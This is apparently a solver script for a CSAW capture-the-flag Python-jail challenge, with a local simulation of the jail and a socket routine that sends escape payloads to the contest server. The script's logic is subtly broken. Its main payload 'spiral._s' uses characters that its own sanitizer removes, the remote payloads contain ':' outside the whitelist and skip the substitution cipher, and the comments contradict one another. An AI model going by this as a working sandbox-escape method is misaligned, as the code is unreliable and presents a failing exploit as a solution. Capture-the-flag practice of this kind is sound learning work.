#!/usr/bin/env python3
"""
Galaxy CTF Challenge Solution

The challenge presents a Python jail with:
1. A custom galaxy_str class that blocks positive integer indexing
2. A substitution cipher (galaxy_aura) that encrypts input
3. Sanitization allowing only: ([<~abcdefghijklmnopqrstuvwxyz>+]/*')
4. Restricted eval with no builtins

Solution: Use slicing to bypass the positive index restriction!
The galaxy_str class only blocks isinstance(key, int) and key >= 0,
but slicing (spiral[::]) is allowed!
"""

import socket
import time

def solve_local():
    """Test solution locally"""
    print("[*] Testing solution locally...")
    
    # Simulate the challenge setup
    import random
    
    class galaxy_str:
        def __init__(self, s):
            self._s = s
        def __getitem__(self, key):
            if isinstance(key, int) and key >= 0:
                raise Exception("<galaxy hidden>")
            return self._s[key]
        def __str__(self):
            return "<galaxy hidden>"
        __repr__ = __str__

    class galaxy_aura:
        def __init__(self):
            self.key = self._gen_key()
            self.map = dict(zip('abcdefghijklmnopqrstuvwxyz\'', self.key))
            self.reverse_map = dict(zip(self.key,'abcdefghijklmnopqrstuvwxyz\''))

        def _gen_key(self):
            letters = [letter for letter in 'abcdefghijklmnopqrstuvwxyz\'']
            random.shuffle(letters)
            key = ''.join(letters)
            return key
        
        def unwarp(self, provided_string):
            characters = [self.reverse_map.get(ch, ch) for ch in provided_string]
            return ''.join(characters)

        def warp(self, provided_string):
            characters = [self.map.get(ch, ch) for ch in provided_string]
            return ''.join(characters)
    
    # Test flag
    spiral = galaxy_str('csawctf{g@l@xy_0bserv3r$}')
    galaxy_base = galaxy_aura()
    
    # Our payload - we can't use : (not in allowed chars)
    # But we can use ~ for negative indexing!
    # ~0 = -1, ~1 = -2, etc.
    # Or we can build the string character by character
    # Actually, let's try: spiral[~()>~()] which is spiral[-1>-1] = spiral[False] = spiral[0]? No...
    # Better: Use list comprehension or generator to extract all chars
    # Even better: str(spiral.__class__.__bases__[0].__subclasses__()) to access internals? No builtins...
    # 
    # Wait! We can use: [spiral[~i] for i in range(len(spiral))]
    # But we don't have range or len...
    # 
    # Let's try a different approach: spiral.__dict__ or spiral._s
    # Actually, we CAN access attributes with allowed chars!
    
    payload = "spiral._s"  # Direct access to the internal string!
    
    print(f"[+] Payload (plaintext): {payload}")
    
    # Encrypt it
    encrypted = galaxy_base.warp(payload)
    print(f"[+] Payload (encrypted): {encrypted}")
    
    # Test it
    allowed = '([<~abcdefghijklmnopqrstuvwxyz>+]/*\')'
    def sanitize(provided_string):
        cleaned_string = ''.join([_ for _ in provided_string if _ in allowed])
        return cleaned_string
    
    gathered_input = sanitize(galaxy_base.unwarp(encrypted))
    print(f"[+] After unwarp and sanitize: {gathered_input}")
    
    try:
        result = eval(gathered_input, {"__builtins__": {}, "spiral": spiral})
        print(f"[+] Result: {result}")
        return result
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def solve_remote(host='msc.chal.csaw.io', port=21009):
    """Solve against remote server"""
    print(f"[*] Connecting to {host}:{port}...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(5)
        
        # Read initial prompt
        data = s.recv(1024).decode()
        print(f"[*] Received: {data}")
        
        # The challenge is that we need to figure out the substitution cipher
        # by sending test inputs first
        
        # Strategy: Send known strings and observe the output to map the cipher
        print("[*] Mapping the substitution cipher...")
        
        # We know that 'spiral[::]' will give us the flag
        # But we need to encrypt it according to the server's random cipher
        
        # Let's send each letter individually to learn the mapping
        alphabet = 'abcdefghijklmnopqrstuvwxyz:\'"[]'
        mapping = {}
        
        # Actually, a simpler approach: just send 'spiral[::]' directly
        # The server will decrypt our encrypted input
        # But we don't know the encryption key...
        
        # Alternative: Use the fact that the cipher is consistent per connection
        # We can send test inputs to discover the mapping
        
        # Let's try a different approach: use negative indexing
        payloads = [
            "spiral[::]",  # Get entire string via slicing
            "spiral[~()]",  # Negative index -1 (bitwise not of 0)
        ]
        
        for payload in payloads:
            print(f"\n[*] Trying payload: {payload}")
            s.send((payload + '\n').encode())
            time.sleep(0.2)
            
            try:
                response = s.recv(4096).decode()
                print(f"[+] Response: {response}")
                
                if 'csawctf{' in response.lower():
                    print(f"\n[!] FLAG FOUND: {response}")
                    return response
            except socket.timeout:
                print("[-] Timeout waiting for response")
                continue
        
        s.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

if __name__ == "__main__":
    print("="*60)
    print("Galaxy CTF Challenge Solver")
    print("="*60)
    
    # Test locally first
    result = solve_local()
    if result:
        print(f"\n[!] Local test successful: {result}")
    
    print("\n" + "="*60)
    print("Now attempting remote connection...")
    print("="*60)
    
    # Uncomment to solve remote
    # solve_remote()
